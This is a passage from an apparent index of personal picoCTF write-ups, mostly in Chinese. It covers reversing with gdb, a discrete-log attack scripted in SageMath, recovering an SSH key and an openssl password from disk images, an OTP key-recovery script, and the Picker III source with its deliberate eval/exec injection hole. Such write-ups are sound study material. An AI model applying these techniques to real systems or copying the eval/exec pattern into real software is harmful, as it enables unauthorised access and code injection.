\u0026amp;v116 != v98 ); v18 = memcmp(v115, ptr, 0x40uLL); if ( v18 ) { v18 = 1; puts(\u0026#34;Nope, come back later\u0026#34;); } else { puts(\u0026#34;Yep, that\u0026#39;s it!\u0026#34;); } return v18; } :::\nRecon # 這一題一開始要我們輸入些東西，應該是flag，不用管中間的一些操作，可以先考慮最後怎麼判斷是不是回答正確就好，可以看到他最後call了一個memcmp的system function，應該就是用來判斷，所以我們只要continue到那裡，應該就會知道原本的flag是多少了\nExploit # $ gdb not-crypto gef➤ starti gef➤ vmmap # 確認目前code sction的base address是多少 gef➤ b *(0x0000555555555000+0x3b9) gef➤ c aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa # fake flag for temp gef➤ x/s 0x00007fffffffd730 0x7fffffffd730: \u0026#34;picoCTF{c0mp1l3r_0pt1m1z4t10n_15_pur3_w1z4rdry_but_n0_pr0bl3m?}\\n\\226\\327\\377\\377\\377\\177\u0026#34; Flag: picoCTF{c0mp1l3r_0pt1m1z4t10n_15_pur3_w1z4rdry_but_n0_pr0bl3m?}\nReference # pico reverse - not crypto wp - "},{"id":295,"href":"/security/practice/picoctf/web/picoctf---notepad/","title":"PicoCTF - notepad","section":"Securities","content":" PicoCTF - notepad # Background # Flask實作_基礎_03_簡述url_for與route werkzeug.url_fix\nSource code # Recon # Exploit # Reference # "},{"id":296,"href":"/security/practice/picoctf/crypto/rsa/picoctf---nsa-backdoor/","title":"PicoCTF - NSA Backdoor","section":"Securities","content":" PicoCTF - NSA Backdoor # tags: PicoCTF CTF Crypto # Background # Baby Step Giant Step - BSGS\n用来解决如下方程最小正整數解的 $A^x\\equiv B(mod\\ C)$，其中$0\\le x\\lt C$ 如果$A\\ge C, B\\ge C$，那麼我們可以先取模，即$A% = C, B% = C$，所以在這裡我們只討論$0\\le A, B\\lt C$的情況。 普通的BSGS的步驟是這樣的：\n首先確定$x$的下限是$0$，上限是$C$，我們令$M=\\lceil C\\rceil$ 把$A^0~A^M\\ mod\\ C$的值存到一个Hash表裡面 把$(A^M)^0~(A^M)^M\\ mod\\ C$的值一一枚舉出來，每枚舉一個就在Hash表裡面尋找是否有一個$val$值滿足$val \\cdot (A^M)^i\\ mod\\ C=B$，如果有則找到答案，否則繼續 最終答案就是$i\\cdot M+val$的值對應的原來$A$的冪 上面是普通Baby Step Giant Step的步驟，比較簡單，只適用為素數的情況。如果為合數呢？ 拓展的過程詳見全文\n離散對數問題 - pohlig-hellman算法講解\n需要注意的是，pohlig-hellman算法的覆雜度在一般情況下比BSGS高！ 因此，使用pohlig-hellman的場合只能是較為特殊的情況，即:$p$是質數，且$p-1$包含的質因子較少\u0026amp;較小。\n和BSGS算法一樣，pohlig-hellman算法也是用於解決離散對數問題（也有很多文獻提到是解決橢圓曲線之類的）。即給定$a,b,p$,求 $a^x \\equiv b(mod\\ p)$。\n歐拉定理: 若$(a,p)=1$，那麽$a^{φ(p)} \\equiv1(mod\\ p)······(*)$ 證明略。\n費馬小定理: 如果$p$是質數，那$φ(p)=p-1$。\n對於$a^x\\equiv b(mod\\ p)$，記其原根為$g$，則$a=g^{a_i},b=g^{b_i}$(原根的次冪可以在[1,p-1]中一一對應，故$a_i,b_i$必定存在)，即$g^{a_ix}\\equiv g^{b_i}(mod\\ p)$，所以$a_ix\\equiv b_i(mod\\ p-1)$，(因為$g^{p-1}\\equiv 1(mod\\ p)$，$p−1$是最小循環節，即階)，故利用egcd求出$x$即可。，於是我們的問題就變成了如何求$a_i,b_i$。\n之後詳細的步驟詳見原文\nSource code # output.txt n = 98a3425eee4016a2592706867127e6c52ab2cf8077806f5626095e3afadc73cb4d0e747c5b9bf6234242e9578b12aba5e391e04a5cd2730f6e45d9f0758fb69eb32e0070b9efd3470f6571a8443bae63cd16efcb3e945dc3da1ce46993be4c8b4467ffb4e0525428bb8673ba144b0d36d1c34fe87307d68439070da27a8809551aa6cdf55c39c79bb7b6b7b9c26b45ef79f6c1ebf68033e4beab2d24df66f69dfb7f54d70d3b477fc7b67592cb029dfe6341c591c34a127f84b33626cd117707b69d1ed55f1773e3ba8d26b76f2db95e85de14a6aa1ff3de7fa23ce9f7ebd0e6c18c2fef4bbff47b6bd632d2d767aab7d35bf4d8577e50556626096704f0c425 c = 8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8 gen.py :::spoiler Source Code #!/usr/bin/python from binascii import hexlify from gmpy2 import * import math import os import sys if sys.version_info \u0026lt; (3, 9): math.gcd = gcd math.lcm = lcm _DEBUG = False FLAG = open(\u0026#39;flag.txt\u0026#39;).read().strip() FLAG = mpz(hexlify(FLAG.encode()), 16) SEED = mpz(hexlify(os.urandom(32)).decode(), 16) STATE = random_state(SEED) def get_prime(state, bits): return next_prime(mpz_urandomb(state, bits) | (1 \u0026lt;\u0026lt; (bits - 1))) def get_smooth_prime(state, bits, smoothness=16): p = mpz(2) p_factors = [p] while p.bit_length() \u0026lt; bits - 2 * smoothness: factor = get_prime(state, smoothness) p_factors.append(factor) p *= factor bitcnt = (bits - p.bit_length()) // 2 while True: prime1 = get_prime(state, bitcnt) prime2 = get_prime(state, bitcnt) tmpp = p * prime1 * prime2 if tmpp.bit_length() \u0026lt; bits: bitcnt += 1 continue if tmpp.bit_length() \u0026gt; bits: bitcnt -= 1 continue if is_prime(tmpp + 1): p_factors.append(prime1) p_factors.append(prime2) p = tmpp + 1 break p_factors.sort() return (p, p_factors) while True: p, p_factors = get_smooth_prime(STATE, 1024, 16) if len(p_factors) != len(set(p_factors)): continue # Smoothness should be different or some might encounter issues. q, q_factors = get_smooth_prime(STATE, 1024, 17) if len(q_factors) == len(set(q_factors)): factors = p_factors + q_factors break if _DEBUG: import sys sys.stderr.write(f\u0026#39;p = {p.digits(16)}\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;p_factors = [\\n\u0026#39;) for factor in p_factors: sys.stderr.write(f\u0026#39; {factor.digits(16)},\\n\u0026#39;) sys.stderr.write(f\u0026#39;]\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;q = {q.digits(16)}\\n\\n\u0026#39;) sys.stderr.write(f\u0026#39;q_factors = [\\n\u0026#39;) for factor in q_factors: sys.stderr.write(f\u0026#39; {factor.digits(16)},\\n\u0026#39;) sys.stderr.write(f\u0026#39;]\\n\\n\u0026#39;) n = p * q c = pow(3, FLAG, n) print(f\u0026#39;n = {n.digits(16)}\u0026#39;) print(f\u0026#39;c = {c.digits(16)}\u0026#39;) ::: Recon # 這一題有點難，應該說觀念很簡單，我也有想到但不知道怎麼實作，簡單來說就是解discrete log的問題，總而言之，這一題和Very Smooth幾乎一樣，差別在於他把flag當成exponent，i.e. $c=3^{flag}\\ mod\\ n$，並且提供$n, c$，所以我們要解出flag為多少\nExploit - Pohlig-Hellman(SageMath) # Factor $p$ and $q$ Method 1 from gmpy2 import * from Crypto.Util.number import long_to_bytes a = 2 n = 2 N = \u0026#34;98a3425eee4016a2592706867127e6c52ab2cf8077806f5626095e3afadc73cb4d0e747c5b9bf6234242e9578b12aba5e391e04a5cd2730f6e45d9f0758fb69eb32e0070b9efd3470f6571a8443bae63cd16efcb3e945dc3da1ce46993be4c8b4467ffb4e0525428bb8673ba144b0d36d1c34fe87307d68439070da27a8809551aa6cdf55c39c79bb7b6b7b9c26b45ef79f6c1ebf68033e4beab2d24df66f69dfb7f54d70d3b477fc7b67592cb029dfe6341c591c34a127f84b33626cd117707b69d1ed55f1773e3ba8d26b76f2db95e85de14a6aa1ff3de7fa23ce9f7ebd0e6c18c2fef4bbff47b6bd632d2d767aab7d35bf4d8577e50556626096704f0c425\u0026#34; c = \u0026#34;8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8\u0026#34; c = int(c, 16) N = int(N, 16) while True: a = powmod(a, n, N) res = gcd(a-1, N) if res != 1 and res != N: q = N // res print(\u0026#34;q = {}\\np = {}\u0026#34;.format(q, res)) break n += 1 Method 2 import primefac n = 0xd63c7cb032ae4d3a43ecec4999cfa8f8b49aa9c14374e60f3beeb437233e44f988a73101f9b20ffb56454350b1c9032c136142220ded059876ccfde992551db46c27f122cacdd38c86acb844032f8600515aa6ccb7a1d1ac62d04b51b752476d2d6ee9f22d0f933bebdd833a71fd30510479fcc7ba0afb1d4b0a1622cdc2a48341010dffdcfc8d9af45959fb30b692dc2c9e181ac6bcd6a701326e3707fb19b7f9dfe1c522c68f9b0d229d384be1e1c58f72f8df60ca5172a341a7ee81428a064beedd6af7b89cc6079f2b6d3717f0d29330f0a70acca05bf67ab60c2e5cb0b86bfca2c9b8d50d79d24371432a1efb243f3c5f15b377ccc51f6e69bfbf5ecc61 c = 0x51099773fd2aafd5f84dfe649acbb3558797f58bdc643ac6ee6f0a6fa30031767966316201c36be69241d9d05d0bd181ced13809f57b0c0594f6b29ac74bc7906dae70a2808799feddc71cf5b28401100e5e7e0324b9d8b56e540c725fa4ef87b9e8d0f901630da5f7f181f6d5b4cdc00d5f5c3457674abcb0d0c173f381b92bdfb143c595f024b98b9900410d502c87dfc1633796d640cb5f780fa4b6f0414fb51e34700d9096caf07b36f4dcd3bb5a2d126f60d3a802959d6fadf18f4970756f3099e14fa6386513fb8e6cdda80fdc1c32a10f6cdb197857caf1d7abf3812e3d9dcda106fa87bac382d3e6fc216c55da02a0c45a482550acb2f58bea2cfa03 q = primefac.pollard_pm1(n) p = n//q print(f\u0026#39;p = {p}\u0026#39;) print(f\u0026#39;q = {q}\u0026#39;) Use SageMath to address Discrete Log Problem p = 117635180960139721127318189832610714114593440637486157582828661167364276581210599344857316369131977790468647533227778603367761815400416396281259234299247850289710613080530669849409358755399675041263469367135430665518150110493389671646158566214130516002949975036799297119111385228596853422400303735447298026283 q = 163800729847029979711295941089800020300275211671661376396219775666688832353701752860857691086339595920419175562271802936423756228938551439950541873798393442729921516031775531740506399414675546114663346731428381174638773512946351966471041847661507898143967764453261943807056370639171597924004988320983393199599 c = 0x8788542cefd7490c9282c06b8d24280d56c6706b996bdf580290cdf2cb90e45efd2ce185fc07d2b916c24b0512d38ca14de0ee608a9d6003f258859bbbed97dad15c1d07410a34fd55cd8305eb43418d38f1ca6e024725b97fd9da701a39c23fe55a13d43b4bf9a3d9ebb44d7fe67bd60beffc29ec27bb4baf05ec5b250bfa68360df0d1379c066297a7878e59d27e68cf6a0da90755450827623e54e4f3d9f280fef53c7620d58decfbd10dd64e9d1d5507b5460603c58f5be70c82e2a8e613d730a950caea4c4389c5fc0521f8207ead5fb26c04eb6d0486fd6fe8d015fdabbda00139b42163acc86ffb30c12988058c6247344c42b8f3cdc984c06f4276f8 g = Mod(3,p) m = discrete_log(c,g) print(hex(m)) g2 = Mod(3,q) m2 = discrete_log(c,g2) print(m2) print(hex(m2)[2:]) Output 0x7069636f4354467b6233773472335f30665f63306d7030733174335f6d3064756c315f39396633383833377d 4028375274964940959020413024799108535910958820283330112174774258028392431441247073675773191542213151242109 7069636f4354467b6233773472335f30665f63306d7030733174335f6d3064756c315f39396633383833377d Flag: picoCTF{b3w4r3_0f_c0mp0s1t3_m0dul1_99f38837}\nReference # pico2022 nsa backdoor\n"},{"id":297,"href":"/security/practice/picoctf/misc/disk/picoctf---operation-oni/","title":"PicoCTF - Operation Oni","section":"Securities","content":" PicoCTF - Operation Oni # Background # How to View Your SSH Keys in Linux, macOS and Windows\nISO和IMG有哪些區別\nISO和IMG的區別 # ISO和IMG都是操作系統鏡像文件的擴展名，它們的主要區別在以下幾個方面：\n來源不同 ISO文件通常來自光盤鏡像，例如Windows安裝光盤的ISO鏡像文件。而IMG文件可以來自多種渠道，例如從移動設備制造商下載的Android操作系統鏡像文件，或者是從虛擬機軟件中制作的虛擬機磁盤鏡像文件。 文件格式不同 ISO文件使用ISO 9660標準格式，而IMG文件可以使用多種格式，例如RAW、VMDK、VDI等。 兼容性不同 ISO文件在各種操作系統和軟件中都有良好的兼容性，而IMG文件在一些操作系統或軟件中可能存在兼容性問題。 使用範圍不同 ISO文件主要用於制作光盤或者USB啟動盤，用於安裝操作系統或者救援系統等。而IMG文件主要用於移動設備或者虛擬機等環境下的操作系統安裝或備份。 總之，ISO和IMG都是操作系統鏡像文件的擴展名，雖然它們在一些方面有類似之處，但在來源、文件格式、兼容性和使用範圍等方面存在差異，應根據具體的需求來選擇使用哪種格式。 Description # Download this disk image, find the key and log into the remote machine. Note: if you are using the webshell, download and extract the disk image into /tmp not your home directory.\nDownload disk image Remote machine: ssh -i key_file -p 59801 ctf-player@saturn.picoctf.net Recon # 這一題和DF有關，主要就是分析拿到的img file，可以用Autopsy之類的分析軟體\nssh參數 先看launch instance之後出現的連線command，ssh帶有-i的參數，根據tldr的常用說明，代表需要給他一個private key file，這也是description中有提到的部分\n$ tldr ssh ... - Connect to a remote server using a specific port: ssh username@remote_host -p 2222 ... Using Autopsy 使用Autopsy分析img file，會面臨到ssh private key在哪裡的問題，根據1的說明通常會放在~/.ssh/或是/root/.ssh/的folder中，所以我們就可以往這個方向找看看 果不其然，的確有一個pub檔案和private key file，直接export出這個檔案，然後夾帶進command就可以了\nError 過程中可能會遇到Permission Too Open這個error，原因可以看2或是看Almond的WP1\n$ ssh -i ssh-private-key -p 59801 ctf-player@saturn.picoctf.net @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ @ WARNING: UNPROTECTED PRIVATE KEY FILE! @ @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@ Permissions 0777 for \u0026#39;ssh-private-key\u0026#39; are too open. It is required that your private key files are NOT accessible by others. This private key will be ignored. Load key \u0026#34;ssh-private-key\u0026#34;: bad permissions ctf-player@saturn.picoctf.net\u0026#39;s password: 簡單來說就是ssh-private-key這個檔案的權限太多了，因為我是直接export到windows的主機，所以預設是777，根據2，只需要設定600就可以過了，同時也可以直接看該檔案在img file中的mode是多少 Exploit # $ ll -rwxrwxrwx 1 sbk6401 sbk6401 411 Sep 25 13:59 ssh-private-key $ chmod 600 ssh-private-key $ ssh -i ssh-private-key -p 57846 ctf-player@saturn.picoctf.net Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.19.0-1024-aws x86_64) * Documentation: https://help.ubuntu.com * Management: https://landscape.canonical.com * Support: https://ubuntu.com/advantage This system has been minimized by removing packages and content that are not required on a system that users do not log into. To restore this content, you can run the \u0026#39;unminimize\u0026#39; command. The programs included with the Ubuntu system are free software; the exact distribution terms for each program are described in the individual files in /usr/share/doc/*/copyright. Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by applicable law. ctf-player@challenge:~$ ls flag.txt ctf-player@challenge:~$ cat flag.txt picoCTF{k3y_5l3u7h_af277f77}ctf-player@challenge:~$ Connection to saturn.picoctf.net closed by remote host. Connection to saturn.picoctf.net closed. Flag: picoCTF{k3y_5l3u7h_af277f77}\nReference # picoGym (picoCTF) Exercise: Operation Oni \u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\nssh \u0026ldquo;permissions are too open\u0026rdquo;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\u0026#160;\u0026#x21a9;\u0026#xfe0e;\n"},{"id":298,"href":"/security/practice/picoctf/misc/disk/picoctf---operation-orchid/","title":"PicoCTF - Operation Orchid","section":"Securities","content":" PicoCTF - Operation Orchid # Recon # 這一題過於簡單\nExploit - Forensics / Openssl # Find Encryption Flag File(Autopsy) 可以在/root中找到，然後.ash_history的command紀錄中知道加密的password phrase touch flag.txt nano flag.txt apk get nano apk --help apk add nano nano flag.txt openssl openssl aes256 -salt -in flag.txt -out flag.txt.enc -k unbreakablepassword1234567 shred -u flag.txt ls -al halt Script\n$ openssl aes-256-cbc -in flag.txt.enc -d enter aes-256-cbc decryption password: *** WARNING : deprecated key derivation used. Using -iter or -pbkdf2 would be better. bad decrypt 140342062343488:error:06065064:digital envelope routines:EVP_DecryptFinal_ex:bad decrypt:crypto/evp/evp_enc.c:612: picoCTF{h4un71ng_p457_5113beab}\u0001% "},{"id":299,"href":"/security/practice/picoctf/reverse/picoctf---otp-implementation/","title":"PicoCTF - OTP Implementation","section":"Securities","content":" PicoCTF - OTP Implementation # Source code # :::spoiler IDA Main Function\nint __cdecl main(int argc, const char **argv, const char **envp) { char v4; // al char v5; // dl unsigned int v6; // eax int i; // [rsp+18h] [rbp-E8h] int j; // [rsp+1Ch] [rbp-E4h] char input_key[112]; // [rsp+20h] [rbp-E0h] BYREF char tmp_key[104]; // [rsp+90h] [rbp-70h] BYREF unsigned __int64 v11; // [rsp+F8h] [rbp-8h] v11 = __readfsqword(0x28u); if ( argc \u0026gt; 1 ) { strncpy(input_key, argv[1], 0x64uLL); input_key[100] = 0; for ( i = 0; valid_char(input_key[i]); ++i )// 確認字元是否在[0-9|a-f]之間 { if ( i ) { v4 = jumble(input_key[i]); v5 = tmp_key[i - 1] + v4; v6 = ((tmp_key[i - 1] + v4) \u0026gt;\u0026gt; 31) \u0026gt;\u0026gt; 28; tmp_key[i] = ((v6 + v5) \u0026amp; 0xF) - v6; } else { tmp_key[0] = jumble(input_key[0]) % 16; } } for ( j = 0; j \u0026lt; i; ++j ) tmp_key[j] += 0x61; if ( i == 100 \u0026amp;\u0026amp; !strncmp( tmp_key, \u0026#34;bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe\u0026#34;, 100uLL) ) { puts(\u0026#34;You got the key, congrats! Now xor it with the flag!\u0026#34;); return 0; } else { puts(\u0026#34;Invalid key!\u0026#34;); return 1; } } else { printf(\u0026#34;USAGE: %s [KEY]\\n\u0026#34;, *argv); return 1; } } :::\n:::spoiler IDA Jumble Function\n__int64 __fastcall jumble(char input_key_char) { char v2; // [rsp+0h] [rbp-4h] char v3; // [rsp+0h] [rbp-4h] v2 = input_key_char; if ( input_key_char \u0026gt; 0x60 ) v2 = input_key_char + 9; v3 = 2 * (v2 % 16); if ( v3 \u0026gt; 15 ) ++v3; return v3; } ::: :::spoiler IDA Valid Function\n_BOOL8 __fastcall valid_char(char a1) { if ( a1 \u0026gt; 0x2F \u0026amp;\u0026amp; a1 \u0026lt;= 0x39 ) return 1LL; return a1 \u0026gt; 0x60 \u0026amp;\u0026amp; a1 \u0026lt;= 0x66; } :::\nRecon # 這一題頗難，我寫的script也沒有很好，readability頗低，但我就爛，懶得優化了\n這一題簡單來說就是把我們輸入的key做一些操作，然後把它和bajbgfa...做比較，如果對了我們就可以直接和他提供的flag進行xor，然後轉換成ASCII\n有幾個重點，首先透過valid_char function可以知道我們輸入的key一定介於[0-9a-f]之間(這是個伏筆，因為他最後會直接和他提供的ciphertext進行xor，所以其實就是hex字元)\n接著可以從後面推回來，第一個flag做了一些操作，之後就直接加上0x61，再和bajbgfa...做比較，所以我們先減回去 :::spoiler tmp_key [1, 0, 9, 1, 6, 5, 0, 15, 1, 2, 2, 11, 6, 14, 4, 9, 6, 15, 0, 10, 12, 3, 8, 11, 0, 11, 15, 14, 12, 5, 3, 11, 10, 13, 6, 10, 7, 0, 11, 9, 11, 2, 15, 10, 9, 6, 13, 3, 11, 6, 12, 15, 3, 6, 12, 13, 12, 4, 15, 5, 8, 10, 0, 13, 4, 15, 14, 15, 1, 0, 15, 5, 10, 3, 6, 11, 4, 8, 11, 7, 10, 5, 6, 8, 11, 6, 0, 1, 11, 3, 14, 5, 1, 2, 0, 4, 3, 6, 5, 4] :::\n接著我們分析jumble function在幹嘛，簡單來說，如果傳入的是\n\u0026lsquo;0\u0026rsquo;-\u0026lsquo;9\u0026rsquo;$\\to$return 0 2 4 6 8 10 12 14 17 19 \u0026lsquo;a\u0026rsquo;-\u0026lsquo;f\u0026rsquo;$\\to$return 21 23 25 27 29 31 跟著if statement走tmp_key[0] = jumble(input_key[0]) % 16; 我們知道tmp_key[0]=0x1(因為key的第一個字元是b$\\to$0x62，減掉0x61=0x1)，所以仔細推敲jumble(input_key[0])的return value是0 2 4 6 8 10 12 14 1 3 5 7 9 11 13 15(對應到的是[0-9a-f])，所以代表0x1在經過mod運算是0x11(要+16)，而正確的key就是對應到的8\n接著換下一個字元，先破哏，if statement裡面的v6基本上是零，畢竟右移那麼多次，也不知道作者設計這個有甚麼用，可能是混淆逆向的?!但反正\nv4 -\u0026gt; jumble(tmp_key[i-1])([0 2 4 6 8 10 12 14 , .... , 31]) v5 -\u0026gt; [0-15]+v4 v6 -\u0026gt; v5 \u0026gt;\u0026gt; 59 (基本上是0) tmp_key[i] = v5 \u0026amp; 0xf 可以看到tmp_key[i]是v5和0xf做and operation，意思是他只會保留一個byte的後四個bits，跟一下gdb會發現前四bits，有可能存在，所以我們可以透過v5-v4是正還是負判斷前四bits有沒有數值，舉個例子，tmp_key[1]是0，而要判斷v5是0x0還是0x10可以透過減掉tmp_key[0]=1來決定，當結果是負的，就要加0x10，所以v5是0x10，v4是0xf，此時會發現沒有相對應的數值可以轉換，因為jumble function的return value並不包含0xf，所以我們要再加上0x10=0x1f，因為其實v5真正的數值是0x20才對，有了v4=31，就可以知道key[1]=\u0026lsquo;f\u0026rsquo;\n就這樣不斷做下去，就能拿到key了，開寫script\nExploit # enc_key = \u0026#34;bajbgfapbcclgoejgpakmdilalpomfdlkngkhaljlcpkjgndlgmpdgmnmepfikanepopbapfkdgleilhkfgilgabldofbcaedgfe\u0026#34; enc_key_1 = [] jumble_table = { 0:{\u0026#39;0\u0026#39;:\u0026#39;0\u0026#39;}, 2:{\u0026#39;2\u0026#39;:\u0026#39;1\u0026#39;}, 4:{\u0026#39;4\u0026#39;:\u0026#39;2\u0026#39;}, 6:{\u0026#39;6\u0026#39;:\u0026#39;3\u0026#39;}, 8:{\u0026#39;8\u0026#39;:\u0026#39;4\u0026#39;}, 10:{\u0026#39;10\u0026#39;:\u0026#39;5\u0026#39;}, 12:{\u0026#39;12\u0026#39;:\u0026#39;6\u0026#39;}, 14:{\u0026#39;14\u0026#39;:\u0026#39;7\u0026#39;}, 1:{\u0026#39;17\u0026#39;:\u0026#39;8\u0026#39;}, 3:{\u0026#39;19\u0026#39;:\u0026#39;9\u0026#39;}, 5:{\u0026#39;21\u0026#39;:\u0026#39;a\u0026#39;}, 7:{\u0026#39;23\u0026#39;:\u0026#39;b\u0026#39;}, 9:{\u0026#39;25\u0026#39;:\u0026#39;c\u0026#39;}, 11:{\u0026#39;27\u0026#39;:\u0026#39;d\u0026#39;}, 13:{\u0026#39;29\u0026#39;:\u0026#39;e\u0026#39;}, 15:{\u0026#39;31\u0026#39;:\u0026#39;f\u0026#39;}, } FLAG= \u0026#34;\u0026#34; def get_flag(str_1): if str_1 % 2 == 0: return jumble_table[str_1][str(str_1)] else: return jumble_table[str_1][str(str_1 + 16)] for i, single_chr in enumerate(enc_key): enc_key_1.append(ord(single_chr) - 0x61) if i == 0: FLAG += get_flag(enc_key_1[-1]) else: tmp = enc_key_1[-1] - enc_key_1[-2] if tmp \u0026lt; 0: tmp += 16 FLAG += get_flag(tmp) cipher_text = open(\u0026#34;./flag.txt\u0026#34;, \u0026#34;r\u0026#34;).read() xor_tmp = int(cipher_text, 16) ^ int(FLAG, 16) print(bytes.fromhex(\u0026#39;{:x}\u0026#39;.format(xor_tmp)).decode(\u0026#39;utf-8\u0026#39;)) Flag: picoCTF{cust0m_jumbl3s_4r3nt_4_g0Od_1d3A_42dad069}\n"},{"id":300,"href":"/security/practice/picoctf/reverse/picoctf---picker-iii/","title":"PicoCTF - Picker III","section":"Securities","content":" PicoCTF - Picker III # Source code # :::spoiler Source Code\nimport re USER_ALIVE = True FUNC_TABLE_SIZE = 4 FUNC_TABLE_ENTRY_SIZE = 32 CORRUPT_MESSAGE = \u0026#39;Table corrupted. Try entering \\\u0026#39;reset\\\u0026#39; to fix it\u0026#39; func_table = \u0026#39;\u0026#39; def reset_table(): global func_table # This table is formatted for easier viewing, but it is really one line func_table = \\ \u0026#39;\u0026#39;\u0026#39;\\ print_table \\ read_variable \\ write_variable \\ getRandomNumber \\ \u0026#39;\u0026#39;\u0026#39; def check_table(): global func_table if( len(func_table) != FUNC_TABLE_ENTRY_SIZE * FUNC_TABLE_SIZE): return False return True def get_func(n): global func_table # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Get function name from table func_name = \u0026#39;\u0026#39; func_name_offset = n * FUNC_TABLE_ENTRY_SIZE for i in range(func_name_offset, func_name_offset+FUNC_TABLE_ENTRY_SIZE): if( func_table[i] == \u0026#39; \u0026#39;): func_name = func_table[func_name_offset:i] break if( func_name == \u0026#39;\u0026#39; ): func_name = func_table[func_name_offset:func_name_offset+FUNC_TABLE_ENTRY_SIZE] return func_name def print_table(): # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return for i in range(0, FUNC_TABLE_SIZE): j = i + 1 print(str(j)+\u0026#39;: \u0026#39; + get_func(i)) def filter_var_name(var_name): r = re.search(\u0026#39;^[a-zA-Z_][a-zA-Z_0-9]*$\u0026#39;, var_name) if r: return True else: return False def read_variable(): var_name = input(\u0026#39;Please enter variable name to read: \u0026#39;) if( filter_var_name(var_name) ): eval(\u0026#39;print(\u0026#39;+var_name+\u0026#39;)\u0026#39;) else: print(\u0026#39;Illegal variable name\u0026#39;) def filter_value(value): if \u0026#39;;\u0026#39; in value or \u0026#39;(\u0026#39; in value or \u0026#39;)\u0026#39; in value: return False else: return True def write_variable(): var_name = input(\u0026#39;Please enter variable name to write: \u0026#39;) if( filter_var_name(var_name) ): value = input(\u0026#39;Please enter new value of variable: \u0026#39;) if( filter_value(value) ): exec(\u0026#39;global \u0026#39;+var_name+\u0026#39;; \u0026#39;+var_name+\u0026#39; = \u0026#39;+value) else: print(\u0026#39;Illegal value\u0026#39;) else: print(\u0026#39;Illegal variable name\u0026#39;) def call_func(n): \u0026#34;\u0026#34;\u0026#34; Calls the nth function in the function table. Arguments: n: The function to call. The first function is 0. \u0026#34;\u0026#34;\u0026#34; # Check table for viability if( not check_table() ): print(CORRUPT_MESSAGE) return # Check n if( n \u0026lt; 0 ): print(\u0026#39;n cannot be less than 0. Aborting...\u0026#39;) return elif( n \u0026gt;= FUNC_TABLE_SIZE ): print(\u0026#39;n cannot be greater than or equal to the function table size of \u0026#39;+FUNC_TABLE_SIZE) return # Get function name from table func_name = get_func(n) # Run the function eval(func_name+\u0026#39;()\u0026#39;) def dummy_func1(): print(\u0026#39;in dummy_func1\u0026#39;) def dummy_func2(): print(\u0026#39;in dummy_func2\u0026#39;) def dummy_func3(): print(\u0026#39;in dummy_func3\u0026#39;) def dummy_func4(): print(\u0026#39;in dummy_func4\u0026#39;) def getRandomNumber(): print(4) # Chosen by fair die roll. # Guaranteed to be random. # (See XKCD) def win(): # This line will not work locally unless you create your own \u0026#39;flag.txt\u0026#39; in # the same directory as this script flag = open(\u0026#39;flag.txt\u0026#39;, \u0026#39;r\u0026#39;).read() #flag = flag[:-1] flag = flag.strip() str_flag = \u0026#39;\u0026#39; for c in flag: str_flag += str(hex(ord(c))) + \u0026#39; \u0026#39; print(str_flag) def help_text(): print( \u0026#39;\u0026#39;\u0026#39; This program fixes vulnerabilities in its predecessor by limiting what functions can be called to a table of predefined functions. This still puts the user in charge, but prevents them from calling undesirable subroutines. * Enter \u0026#39;quit\u0026#39; to quit the program. * Enter \u0026#39;help\u0026#39; for this text. * Enter \u0026#39;reset\u0026#39; to reset the table. * Enter \u0026#39;1\u0026#39; to execute the first function in the table. * Enter \u0026#39;2\u0026#39; to execute the second function in the table. * Enter \u0026#39;3\u0026#39; to execute the third function in the table. * Enter \u0026#39;4\u0026#39; to execute the fourth function in the table. Here\u0026#39;s the current table: \u0026#39;\u0026#39;\u0026#39; ) print_table() reset_table() while(USER_ALIVE): choice = input(\u0026#39;==\u0026gt; \u0026#39;) if( choice == \u0026#39;quit\u0026#39; or choice == \u0026#39;exit\u0026#39; or choice == \u0026#39;q\u0026#39; ): USER_ALIVE = False elif( choice == \u0026#39;help\u0026#39; or choice == \u0026#39;?\u0026#39; ): help_text() elif( choice == \u0026#39;reset\u0026#39; ): reset_table() elif( choice == \u0026#39;1\u0026#39; ): call_func(0) elif( choice == \u0026#39;2\u0026#39; ): call_func(1) elif( choice == \u0026#39;3\u0026#39; ): call_func(2) elif( choice == \u0026#39;4\u0026#39; ): call_func(3) else: print(\u0026#39;Did not understand \u0026#34;\u0026#39;+choice+\u0026#39;\u0026#34; Have you tried 